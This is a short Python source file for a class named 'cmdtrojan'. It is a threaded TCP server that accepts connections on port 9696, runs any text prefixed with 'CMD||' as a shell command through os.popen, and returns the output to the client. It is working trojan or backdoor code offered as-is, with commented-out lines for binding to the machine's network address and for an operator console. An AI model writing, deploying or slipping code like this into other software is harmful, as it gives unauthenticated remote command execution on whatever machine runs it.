import os
import socket
import threading

class cmdtrojan:
    def __init__(self):
        self.tcp = None
        self.MLEN = 1024
        self.__networkinit()

    def __networkinit(self):
        # host = self.getLocalIP()
        host = '127.0.0.1'
        port = 9696
        self.tcps = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tcps.bind((host, port))
        self.tcps.listen(10)
        self.server_main()

    def server_main(self):
        NF = True
        while True:
            if NF:
                print("服务器启动，等待连接......")
            (tcp, Caddr) = self.tcps.accept()
            NF = False
            print("连接的客户端：", Caddr)
            client_handler = threading.Thread(target=self.client_handle, args=(tcp, Caddr))
            client_handler.start()

    def client_handle(self, client_socket, client_addr):
        while True:
            try:
                data = client_socket.recv(self.MLEN).decode()
            except ConnectionResetError:
                print("断开的客户端：", client_addr)
                print("等待下一个连接......")
                break
            if not data:
                continue
            elif data.startswith("CMD||"):
                    a = os.popen(data.split('||')[1])
                    feedback = a.read()
                    print(feedback)
                    client_socket.send(feedback.encode())
            print(data)

    def getLocalIP(self):
        st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        st.connect(("8.8.8.8", 80))
        LIP = st.getsockname()[0]
        print(LIP)
        st.close()
        return LIP
    # def client_handle(self, client_socket, client_addr):
    #     while True:
    #         cmd_str = "CMD||" + input('Input command:')
    #         client_socket.send(cmd_str.encode())
    #         try:
    #             data = client_socket.recv(self.MLEN).decode()
    #         except ConnectionResetError:
    #             print("断开的客户端：", client_addr)
    #             print("等待下一个连接......")
    #             break
    #         if not data:
    #             continue
    #         print(data)


def main():
    cmdtrojan()


if __name__ == '__main__':
    main()
# a = os.popen("ipconfig")
# print(a.read())
